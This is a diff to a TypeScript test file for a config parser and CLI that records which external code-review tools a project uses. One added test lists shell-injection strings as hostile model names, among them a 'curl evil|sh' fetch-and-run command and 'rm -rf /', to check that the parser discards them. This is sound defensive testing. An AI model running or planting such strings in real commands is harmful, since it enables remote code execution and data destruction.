@@ -1,5 +1,13 @@
 import { describe, expect, test } from "bun:test";
-import { existsSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import {
+  existsSync,
+  mkdtempSync,
+  readFileSync,
+  rmSync,
+  writeFileSync,
+} from "node:fs";
+import { tmpdir } from "node:os";
 import { join } from "node:path";
 
 import { read } from "./helpers/text";
@@ -144,6 +152,50 @@ describe("parseTeamConfig — decided vs. undecided + normalization", () => {
     expect(
       fn({ review: { externalReviewers: [{ tool: "codex", model: "  " }] } }),
     ).toEqual({ decided: true, reviewers: [{ tool: "codex", model: null }] });
+  });
+
+  test("a model with shell metacharacters / spaces / semicolons collapses to null", async () => {
+    const fn = await parse();
+    // `model` is passed through to an external CLI flag via Bash, so it is a
+    // shell-injection sink. Any value outside the safe charset must vanish.
+    const hostile = [
+      "gemini-3-pro; curl evil|sh",
+      "x; rm -rf /",
+      "gpt 5",
+      "a|b",
+      "a&&b",
+      "$(whoami)",
+      "`id`",
+      "model\nrm",
+    ];
+    for (const model of hostile) {
+      expect(fn({ review: { externalReviewers: [{ tool: "codex", model }] } })).toEqual({
+        decided: true,
+        reviewers: [{ tool: "codex", model: null }],
+      });
+    }
+  });
+
+  test("a valid model name is preserved", async () => {
+    const fn = await parse();
+    expect(
+      fn({ review: { externalReviewers: [{ tool: "gemini", model: "gemini-3-pro" }] } }),
+    ).toEqual({ decided: true, reviewers: [{ tool: "gemini", model: "gemini-3-pro" }] });
+  });
+
+  test("model names with dots and dashes pass the charset filter", async () => {
+    const fn = await parse();
+    expect(
+      fn({ review: { externalReviewers: [{ tool: "codex", model: "gpt-5.3-codex" }] } }),
+    ).toEqual({ decided: true, reviewers: [{ tool: "codex", model: "gpt-5.3-codex" }] });
+    expect(
+      fn({
+        review: { externalReviewers: [{ tool: "gemini", model: "gemini-3.1-pro-preview" }] },
+      }),
+    ).toEqual({
+      decided: true,
+      reviewers: [{ tool: "gemini", model: "gemini-3.1-pro-preview" }],
+    });
   });
 });
 
@@ -312,14 +364,83 @@ describe("external-reviewers.mjs CLI contract (L2)", () => {
     expect(/JSON array of .*tool.*model|\{tool,model\}/i.test(text)).toBe(true);
   });
 
-  test("doc comment documents the --candidates and --set CLI modes", () => {
+  test("doc comment documents the --candidates, --decided, and --set CLI modes", () => {
     const text = readOrEmpty(MODULE);
     expect(text).toContain("--candidates");
+    expect(text).toContain("--decided");
     expect(text).toContain("--set");
   });
 
   test("does NOT read the plugin manifest for config", () => {
     expect(readOrEmpty(MODULE)).not.toContain(".claude-plugin/plugin.json");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// L3 subprocess round-trip: spawn the real CLI in a hermetic temp cwd so the
+// persistence on-ramp (--set writes, --decided reads back) is exercised
+// end-to-end without ever touching the repo. Deterministic: assertions read
+// the written file + the --decided decision, never the availability probe
+// (which gates on host-installed binaries).
+// ---------------------------------------------------------------------------
+describe("external-reviewers.mjs CLI persistence round-trip (L3)", () => {
+  const run = (cwd: string, args: string[]) =>
+    spawnSync("node", [MODULE, ...args], { cwd, encoding: "utf8" });
+  const readConfig = (dir: string): Record<string, unknown> =>
+    JSON.parse(readFileSync(join(dir, ".claude", "team.json"), "utf8"));
+  const withTmp = (body: (dir: string) => void): void => {
+    const dir = mkdtempSync(join(tmpdir(), "team-extrev-"));
+    try {
+      body(dir);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  };
+
+  test("--set codex,gemini writes the config and --decided reads it back as decided", () => {
+    withTmp((dir) => {
+      const set = run(dir, ["--set", "codex,gemini"]);
+      expect(set.status).toBe(0);
+      expect(readConfig(dir).review).toEqual({ externalReviewers: ["codex", "gemini"] });
+      const decided = run(dir, ["--decided"]);
+      expect(decided.status).toBe(0);
+      expect(decided.stdout.trim()).toBe("decided");
+    });
+  });
+
+  test("--set '' records [] (explicit Claude-only) and still reads back as decided", () => {
+    withTmp((dir) => {
+      expect(run(dir, ["--set", ""]).status).toBe(0);
+      expect(readConfig(dir).review).toEqual({ externalReviewers: [] });
+      expect(run(dir, ["--decided"]).stdout.trim()).toBe("decided");
+    });
+  });
+
+  test("--decided is undecided when no config has been recorded", () => {
+    withTmp((dir) => {
+      const decided = run(dir, ["--decided"]);
+      expect(decided.status).toBe(0);
+      expect(decided.stdout.trim()).toBe("undecided");
+    });
+  });
+
+  test("--set preserves a pre-existing unrelated key in .claude/team.json", () => {
+    withTmp((dir) => {
+      // First --set creates .claude/ and the file; seed an unrelated key into
+      // it, then re-run --set and prove the key survives the merge.
+      expect(run(dir, ["--set", "codex"]).status).toBe(0);
+      writeFileSync(
+        join(dir, ".claude", "team.json"),
+        JSON.stringify({
+          someOtherTool: { enabled: true },
+          review: { externalReviewers: ["codex"] },
+        }),
+      );
+      expect(run(dir, ["--set", "gemini"]).status).toBe(0);
+      const config = readConfig(dir);
+      expect(config.someOtherTool).toEqual({ enabled: true });
+      expect(config.review).toEqual({ externalReviewers: ["gemini"] });
+    });
   });
 });
 
@@ -382,11 +503,18 @@ describe("team-implement/SKILL.md describes the detect-and-prompt on-ramp (L2 tr
     expect(flat(readOrEmpty(TEAM_IMPLEMENT))).toContain(".claude/team.json");
   });
 
-  test("references the external-reviewers probe with --candidates and --set", () => {
+  test("references the external-reviewers probe with --candidates, --decided, and --set", () => {
     const text = flat(readOrEmpty(TEAM_IMPLEMENT));
     expect(text).toContain("external-reviewers.mjs");
     expect(text).toContain("--candidates");
+    expect(text).toContain("--decided");
     expect(text).toContain("--set");
+  });
+
+  test("the prompt gate decides via the --decided CLI check, not raw-JSON inspection", () => {
+    const text = flat(readOrEmpty(TEAM_IMPLEMENT));
+    // The recorded-decision condition must run on the tested deterministic core.
+    expect(/--decided.*(prints?|reads?).*undecided|undecided.*--decided/i.test(text)).toBe(true);
   });
 
   test("uses AskUserQuestion to prompt for detected providers", () => {
